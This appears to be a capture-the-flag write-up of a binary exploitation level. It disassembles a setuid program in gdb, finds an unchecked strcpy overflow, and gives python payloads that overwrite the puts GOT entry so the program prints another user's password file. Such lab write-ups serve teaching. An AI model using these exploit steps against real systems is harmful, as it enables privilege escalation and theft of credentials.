# Level 7

## First clue
- once logged in as level7 we find again an executable  owned by `level8` 
- we try to execute it without arguments and we get a segfault
- if we write one or more alpha and numeric argiments, we get back `~~`

## Inspect with gdb
- `(gdb) info function` reveals main and m functions, but also a system call, malloc, strcpy, time, puts and printf. 
```
0x0804836c  _init
0x080483b0  printf
0x080483b0  printf@plt
0x080483c0  fgets
0x080483c0  fgets@plt
0x080483d0  time
0x080483d0  time@plt
0x080483e0  strcpy
0x080483e0  strcpy@plt
0x080483f0  malloc
0x080483f0  malloc@plt
0x08048400  puts
0x08048400  puts@plt
0x08048410  __gmon_start__
0x08048410  __gmon_start__@plt
0x08048420  __libc_start_main
0x08048420  __libc_start_main@plt
0x08048430  fopen
0x08048430  fopen@plt
0x08048440  _start
0x08048470  __do_global_dtors_aux
0x080484d0  frame_dummy
0x080484f4  m
0x08048521  main
0x08048610  __libc_csu_init
0x08048680  __libc_csu_fini
0x08048682  __i686.get_pc_thunk.bx
0x08048690  __do_global_ctors_aux
0x080486bc  _fini


```
## Main
```
    0x08048521 <+0>:	push   %ebp
   0x08048522 <+1>:	mov    %esp,%ebp
   0x08048524 <+3>:	and    $0xfffffff0,%esp
   0x08048527 <+6>:	sub    $0x20,%esp
   0x0804852a <+9>:	movl   $0x8,(%esp)
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    %eax,0x1c(%esp)
   0x0804853a <+25>:	mov    0x1c(%esp),%eax
   0x0804853e <+29>:	movl   $0x1,(%eax)
   0x08048544 <+35>:	movl   $0x8,(%esp)
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    %eax,%edx
   0x08048552 <+49>:	mov    0x1c(%esp),%eax
   0x08048556 <+53>:	mov    %edx,0x4(%eax)
   0x08048559 <+56>:	movl   $0x8,(%esp)
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    %eax,0x18(%esp)
   0x08048569 <+72>:	mov    0x18(%esp),%eax
   0x0804856d <+76>:	movl   $0x2,(%eax)
   0x08048573 <+82>:	movl   $0x8,(%esp)
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    %eax,%edx
   0x08048581 <+96>:	mov    0x18(%esp),%eax
   0x08048585 <+100>:	mov    %edx,0x4(%eax)
   0x08048588 <+103>:	mov    0xc(%ebp),%eax
   0x0804858b <+106>:	add    $0x4,%eax
   0x0804858e <+109>:	mov    (%eax),%eax
   0x08048590 <+111>:	mov    %eax,%edx
   0x08048592 <+113>:	mov    0x1c(%esp),%eax
   0x08048596 <+117>:	mov    0x4(%eax),%eax
   0x08048599 <+120>:	mov    %edx,0x4(%esp)
   0x0804859d <+124>:	mov    %eax,(%esp)
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:	mov    0xc(%ebp),%eax
   0x080485a8 <+135>:	add    $0x8,%eax
   0x080485ab <+138>:	mov    (%eax),%eax
   0x080485ad <+140>:	mov    %eax,%edx
   0x080485af <+142>:	mov    0x18(%esp),%eax
   0x080485b3 <+146>:	mov    0x4(%eax),%eax
   0x080485b6 <+149>:	mov    %edx,0x4(%esp)
   0x080485ba <+153>:	mov    %eax,(%esp)
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:	mov    $0x80486e9,%edx
   0x080485c7 <+166>:	mov    $0x80486eb,%eax
   0x080485cc <+171>:	mov    %edx,0x4(%esp)
   0x080485d0 <+175>:	mov    %eax,(%esp)
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    %eax,0x8(%esp)
   0x080485dc <+187>:	movl   $0x44,0x4(%esp)
   0x080485e4 <+195>:	movl   $0x8049960,(%esp)
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    $0x0,%eax
   0x08048601 <+224>:	leave  
   0x08048602 <+225>:	ret   


```
Disassemblying main we find out that:
- The program takes 2 arguments.
- It opens a file using the fopen function.
- The file being opened is identified as "/home/user/level8/.pass":
```
(gdb)$ x/s 0x80486e9
0x80486e9:	"r"
(gdb)$ x/s 0x80486eb
0x80486eb:	"/home/user/level8/.pass"
```
- The source address for copying is obtained from the second argument (0x18(%esp)).
- The destination address for copying is obtained from the first argument (0x1c(%esp)).
- The first strcpy call copies the content from the second argument (argv[2]) to the buffer pointed to by the first argument (buf).
- The file descriptor returned by fopen is stored on the stack at DWORD PTR [esp+0x8].
- The size of the buffer to read from the file is set to 0x44 (68 in decimal), and this value is also stored on the stack at DWORD PTR [esp+0x4].
- The address 0x8049960 is moved onto the stack, indicating the destination buffer where the content of the file will be stored.
- fgets is then called to read a line from the file. It reads up to 0x44 characters from the file and stores them in the buffer pointed to by 0x8049960.
- Finally, puts is called to print out the content of the buffer (0x8049960).

## Function m

- it's not called anywhere but it handle the same variable located at 0x8049960 that puts print out in main function.
- if we analyze its content we discover that is a global variable called "c":
```
(gdb) x/s 0x8049960
0x8049960 <c>:	 ""
```
- function m pass this variable to printf:
```
  0x080484f4 <+0>:	push   %ebp
   0x080484f5 <+1>:	mov    %esp,%ebp
   0x080484f7 <+3>:	sub    $0x18,%esp
   0x080484fa <+6>:	movl   $0x0,(%esp)
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    $0x80486e0,%edx
   0x0804850b <+23>:	mov    %eax,0x8(%esp)
   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:	mov    %edx,(%esp)
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave  
   0x08048520 <+44>:	ret 
```

## The vulnerability and how to exploit it

- Buffer Overflow: the strcpy calls do not perform bound checking (check if destination buffer is shorter than source string)

How to exploit it: 
- Overwrite Return Address:  we can overwrite the return address of the puts function with the address of the m function. This would cause the program to execute the m function before the main function returns.
Since the main function take 2 args and the second is copied into the buffer pointed to by the first argument, if we pass the puts function address pointer (the one present in GOT) as first arg and the m function address as second arg, we overwrite the return address of the puts function with the address of the m function, hijacking the control flow of the program. This allows us to redirect the program's execution to the m function, which contains the code to print out the c variable, that point to the .pass file we want to cat. 

## Exploit
- to find the offset of the strcpy buffer we run the program in gdb passing as argument a long string made of set of 4 char (in 32 bit architecture alignement memory addresses are divisible by 4) of the alphabet, lower and uppercase:
```
(gdb) run "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'
```
- we get `Program received signal SIGSEGV, Segmentation fault.
0xb7eb8aa8 in ?? () from /lib/i386-linux-gnu/libc.so.6
`
- that means that EIP was not overwritten, but since when a buffer overflow occurs, the extra characters from the input overwrite adjacent memory locations, including the contents of CPU registers such as eax and edx, we check eax and edx and we find "46464646":
```
(gdb) i register
eax            0x46464646	1179010630
ecx            0x0	0
edx            0x46464646	1179010630
```
- 46 is the ASCII for "F" at position 21, so the end of the buffer is at position 20 => `echo "AAAABBBBCCCCDDDDEEEEF" | grep -o .  |  wc -l`
- we store in /tmp/puts 20 letters + the address of puts function (reversed for little endian) and pass /tmp/exploit as argument to ./level7
- the address of puts:
```
(gdb)$ info function puts
All functions matching regular expression "puts":

Non-debugging symbols:
0x08048400  puts@plt

(gdb)$ x/i 0x08048400
0x8048400 <puts@plt>:	jmp    DWORD PTR ds:0x8049928
```
- `python -c 'print "a"*20+"\x28\x99\x04\x08"' > /tmp/puts`
- we store in /tmp/m the address of m function as it appears in info function (reversed for little endian): `080484f4`
- `python -c 'print "\xf4\x84\x04\x08"' > /tmp/m`
- `./level7 $(cat /tmp/puts) $(cat /tmp/m)`
- we get the flag
